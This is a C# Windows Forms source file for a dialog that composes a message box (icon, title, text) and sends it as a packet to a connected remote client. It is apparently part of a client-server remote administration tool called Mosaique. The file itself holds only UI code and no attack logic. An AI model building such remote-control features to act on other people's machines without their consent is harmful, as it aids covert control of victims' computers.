using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.Windows.Forms;


namespace Serveur.Views
{
    public partial class FrmSendMessageBox : Form
    {
        private ClientMosaique _client;
        public int icon = 5;

        public FrmSendMessageBox(ClientMosaique client)
        {
            _client = client;
            InitializeComponent();
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            new MosaiqueServeur.Packets.ServerPackets.SendMessageBox(icon, txtTitle.Text, txtMsg.Text).Execute(_client);
        }

        private void pbDanger_Paint(object sender, PaintEventArgs e)
        {
            if (pbDanger.Tag == null) { pbDanger.Tag = Color.Transparent; } //Sets a default color
            ControlPaint.DrawBorder(e.Graphics, pbDanger.ClientRectangle, (Color)pbDanger.Tag, ButtonBorderStyle.Solid);
        }

        private void pbCross_Paint(object sender, PaintEventArgs e)
        {
            if (pbCross.Tag == null) { pbCross.Tag = Color.Transparent; } //Sets a default color
            ControlPaint.DrawBorder(e.Graphics, pbCross.ClientRectangle, (Color)pbCross.Tag, ButtonBorderStyle.Solid);
        }

        private void pbIntero_Paint(object sender, PaintEventArgs e)
        {
            if (pbIntero.Tag == null) { pbIntero.Tag = Color.Transparent; } //Sets a default color
            ControlPaint.DrawBorder(e.Graphics, pbIntero.ClientRectangle, (Color)pbIntero.Tag, ButtonBorderStyle.Solid);
        }

        private void pbInfo_Paint(object sender, PaintEventArgs e)
        {
            if (pbInfo.Tag == null) { pbInfo.Tag = Color.Transparent; } //Sets a default color
            ControlPaint.DrawBorder(e.Graphics, pbInfo.ClientRectangle, (Color)pbInfo.Tag, ButtonBorderStyle.Solid);
        }

        private void pbNone_Paint(object sender, PaintEventArgs e)
        {
            if (pbNone.Tag == null) { pbNone.Tag = Color.Transparent; } //Sets a default color
            ControlPaint.DrawBorder(e.Graphics, pbNone.ClientRectangle, (Color)pbNone.Tag, ButtonBorderStyle.Solid);
        }

        //
        //
        //

        private void pbInfo_Click(object sender, EventArgs e)
        {
            refreshAll();
            pbInfo.Tag = Color.Blue;
            pbInfo.Refresh();
            icon = 1;
        }

        private void pbIntero_Click(object sender, EventArgs e)
        {
            refreshAll();
            pbIntero.Tag = Color.Blue; 
            pbIntero.Refresh();
            icon = 2;
        }

        private void pbCross_Click(object sender, EventArgs e)
        {
            refreshAll();
            pbCross.Tag = Color.Blue;
            pbCross.Refresh();
            icon = 3;
        }

        private void pbDanger_Click(object sender, EventArgs e)
        {
            refreshAll();
            pbDanger.Tag = Color.Blue;
            pbDanger.Refresh();
            icon = 4;
        }

        private void pbNone_Click(object sender, EventArgs e)
        {
            refreshAll();
            pbNone.Tag = Color.Blue;
            pbNone.Refresh();
            icon = 5;
        }

        private void refreshAll()
        {
            pbCross.Tag = Color.Transparent;
            pbIntero.Tag = Color.Transparent;
            pbInfo.Tag = Color.Transparent;
            pbDanger.Tag = Color.Transparent;
            pbNone.Tag = Color.Transparent;

            pbCross.Refresh();
            pbIntero.Refresh();
            pbInfo.Refresh();
            pbDanger.Refresh();
            pbNone.Refresh();
        }
    }
}
